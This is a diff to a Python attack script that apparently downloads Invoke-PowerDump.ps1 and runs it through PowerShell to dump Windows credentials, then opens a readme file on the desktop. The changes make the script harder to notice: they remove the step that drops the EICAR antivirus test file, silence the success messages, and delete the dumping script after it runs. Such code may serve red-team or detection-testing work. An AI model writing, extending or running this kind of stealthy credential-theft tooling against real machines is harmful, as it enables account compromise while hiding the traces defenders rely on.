@@ -152,10 +152,6 @@ def open_readme_on_desktop():
     else:
         print(f"{readme_filename} not found on the desktop.")
 
-# Download EICAR
-def eicarDownload():
-    subprocess.call('%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe set-content "X5O!P%@AP[4`\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*" -path "eicar.com"', shell=True)
-
 #download tools credential dumping
 def download_file(url, destination):
     try:
@@ -167,7 +163,7 @@ def download_file(url, destination):
             # Save the content to a local file
             with open(destination, 'wb') as file:
                 file.write(response.content)
-            print(f"Downloaded and saved as {destination}")
+            # print(f"Downloaded and saved as {destination}")
         else:
             print(f"Failed to download. Status code: {response.status_code}")
 
@@ -179,7 +175,8 @@ def executePowerDump(script_path):
         # Import the module and run the PowerShell script
         ps_command = f"Import-Module .\\{script_path}; .\\{script_path}"
         subprocess.run(["powershell", "-Command", ps_command], check=True)
-        print("PowerShell script executed successfully")
+        # print("PowerShell script executed successfully")
+        os.remove("Invoke-PowerDump.ps1")
 
     except Exception as e:
         print(f"Error: {e}")    
@@ -230,9 +227,6 @@ if __name__ == "__main__":
 
     # Open readme.txt
     open_readme_on_desktop()
-
-    # Download EICAR
-    eicarDownload()
 
     # Credential Dumping
     # Download the script
